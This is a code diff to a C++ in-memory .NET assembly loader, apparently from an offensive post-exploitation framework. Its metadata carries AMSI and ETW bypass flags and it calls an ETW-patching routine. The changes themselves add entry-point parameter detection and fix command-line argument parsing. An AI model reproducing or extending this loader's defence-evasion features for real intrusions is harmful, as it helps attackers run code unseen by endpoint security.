@@ -45,9 +45,8 @@ struct Metadata
 	unsigned int assemblySize;
 	unsigned char amsiBypass;
 	unsigned char etwBypass;
-	unsigned char signature;
 };
-DWORD METADATA_SIZE = 23;
+DWORD METADATA_SIZE = 22;
 
 int executeSharp(LPVOID lpPayload)
 {
@@ -66,6 +65,7 @@ int executeSharp(LPVOID lpPayload)
 	VARIANT retVal;
 	VARIANT obj;
 	SAFEARRAY* psaStaticMethodArgs;
+	SAFEARRAY* psaEntryPointParameters;
 	VARIANT vtPsa;
 
 	char* pipeName = NULL;
@@ -169,7 +169,7 @@ int executeSharp(LPVOID lpPayload)
 		goto Cleanup;
 	}
 
-	//Etw bypass
+	// Etw bypass
 	if (metadata.etwBypass)
 	{
 		int ptcResult = PatchEtw(pipe);
@@ -290,30 +290,68 @@ int executeSharp(LPVOID lpPayload)
 		goto Cleanup;
 	}
 
+	// Let's check the number of parameters: must be either the 0-arg Main(), or a 1-arg Main(string[])
+	pMethodInfo->GetParameters(&psaEntryPointParameters);
+	hr = SafeArrayLock(psaEntryPointParameters);
+	if (!SUCCEEDED(hr))
+	{
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to lock param array w/hr 0x%08lx\n", hr);
+		goto Cleanup;
+	}
+	long uBound, lBound;
+	SafeArrayGetLBound(psaEntryPointParameters, 1, &lBound);
+	SafeArrayGetUBound(psaEntryPointParameters, 1, &uBound);
+	long numArgs = uBound - lBound + 1;
+	hr = SafeArrayUnlock(psaEntryPointParameters);
+	if (!SUCCEEDED(hr))
+	{
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Failed to unlock param array w/hr 0x%08lx\n", hr);
+		goto Cleanup;
+	}
+
 	ZeroMemory(&retVal, sizeof(VARIANT));
 	ZeroMemory(&obj, sizeof(VARIANT));
 
 	obj.vt = VT_NULL;
 	vtPsa.vt = (VT_ARRAY | VT_BSTR);
 
-	// Managing parameters
-	if (metadata.signature == '\x02')
+	switch (numArgs)
 	{
-		// If we have at least 1 parameter set cEleemnt to 1
+	case 0:
+		if (metadata.argsSize > 1) // There is always a Null byte at least, so "1" in size means "0 args"
+		{
+			ReportErrorThroughPipe(pipe, "[CLRHOST] Assembly takes no arguments, but some were provided\n");
+			goto Cleanup;
+		}
+		// If no parameters set cElement to 0
+		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+		break;
+	case 1:
+	{
+		// If we have at least 1 parameter set cElement to 1
 		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
+
+		// Here we unfortunately need to do a trick. CommandLineToArgvW treats the first argument differently, as
+		// it expects it to be a filename. This affects situations where the first argument contains backslashes,
+		// or if there are no arguments at all (it will just create one - the process's image name).
+		// To coerce it into performing the correct data transformation, we create a fake first parameter, and then
+		// ignore it in the output.
 
 		LPWSTR* szArglist;
 		int nArgs;
-		wchar_t* wtext = (wchar_t*)malloc((sizeof(wchar_t) * metadata.argsSize));
+		wchar_t* wtext = (wchar_t*)malloc((sizeof(wchar_t) * (metadata.argsSize + 2)));
+		wtext[0] = L'X'; // Fake process name
+		wtext[1] = L' '; // Separator
 
-		mbstowcs(wtext, (char*)arg_s, metadata.argsSize);
+
+		mbstowcs(wtext+2, (char*)arg_s, metadata.argsSize);
 		szArglist = CommandLineToArgvW(wtext, &nArgs);
 
 		free(wtext);
 
-		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs);
+		vtPsa.parray = SafeArrayCreateVector(VT_BSTR, 0, nArgs - 1); // Subtract 1, to ignore the fake process name
 
-		for (long i = 0; i < nArgs; i++)
+		for (long i = 1; i < nArgs; i++) // Start a 1 - ignoring the fake process name
 		{
 			size_t converted;
 			size_t strlength = wcslen(szArglist[i]) + 1;
@@ -324,20 +362,23 @@ int executeSharp(LPVOID lpPayload)
 
 			mbstowcs_s(&converted, sOleText1, strlength, buffer, strlength);
 			BSTR strParam1 = SysAllocString(sOleText1);
-
-			SafeArrayPutElement(vtPsa.parray, &i, strParam1);
+			long actualPosition = i - 1;
+			SafeArrayPutElement(vtPsa.parray, &actualPosition, strParam1);
 			free(buffer);
 		}
 
+		LocalFree(szArglist);
+
 		long iEventCdIdx(0);
 		hr = SafeArrayPutElement(psaStaticMethodArgs, &iEventCdIdx, &vtPsa);
+		break;
 	}
-	else
-	{
-		// if no parameters set cEleemnt to 0
-		psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 0);
+	default:
+		ReportErrorThroughPipe(pipe, "[CLRHOST] Unexpected argument length: %d\n", numArgs);
+		goto Cleanup;
 	}
-	// Assembly execution
+
+	//Assembly execution
 	hr = pMethodInfo->Invoke_3(obj, psaStaticMethodArgs, &retVal);
 	if (FAILED(hr))
 	{
